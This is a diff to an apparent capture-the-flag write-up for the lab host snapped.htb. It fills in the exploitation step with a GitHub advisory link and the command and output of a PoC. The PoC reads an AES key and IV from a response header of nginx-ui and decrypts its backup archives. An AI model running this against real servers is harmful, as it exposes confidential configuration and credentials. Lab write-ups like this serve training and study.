@@ -80,10 +80,35 @@ Description of the vulnerability exploited.
 
 ### Exploitation
 
-Step-by-step exploitation with commands.
+poc: https://github.com/advisories/GHSA-g9w5-qffc-6762
 
 ```shell
-# Commands used
+python3 poc.py --target http://admin.snapped.htb --out backup.bin --decrypt                   
+
+X-Backup-Security: I2BYayPDb79HJvt7XkOnOYpeqOpxx96Wk4atqrdhzcY=:dEr+E8UZbS0a7TTu9tq82Q==
+Parsed AES-256 key: I2BYayPDb79HJvt7XkOnOYpeqOpxx96Wk4atqrdhzcY=
+Parsed AES IV    : dEr+E8UZbS0a7TTu9tq82Q==
+
+[*] Key length: 32 bytes (AES-256 ✓)
+[*] IV length : 16 bytes (AES block size ✓)
+
+[*] Extracting encrypted backup to backup_extracted
+[*] Main archive contains: ['hash_info.txt', 'nginx-ui.zip', 'nginx.zip']
+[*] Decrypting hash_info.txt...
+    → Saved to backup_extracted/hash_info.txt.decrypted (199 bytes)
+[*] Decrypting nginx-ui.zip...
+    → Saved to backup_extracted/nginx-ui_decrypted.zip (7765 bytes)
+    → Extracted 2 files to backup_extracted/nginx-ui
+[*] Decrypting nginx.zip...
+    → Saved to backup_extracted/nginx_decrypted.zip (9936 bytes)
+    → Extracted 22 files to backup_extracted/nginx
+
+[*] Hash info:
+nginx-ui_hash: c5ec27f75aef9bf7861697d197964dbd8b327e354cfc111f54065f1abf7c9f13
+nginx_hash: 9b17eb8d31e6dc4a120a28a1048cfc8bd816fff3f9beb05495306e02329a862d
+timestamp: 20260911-111839
+version: 2.3.2
+
 ```
 
 ---
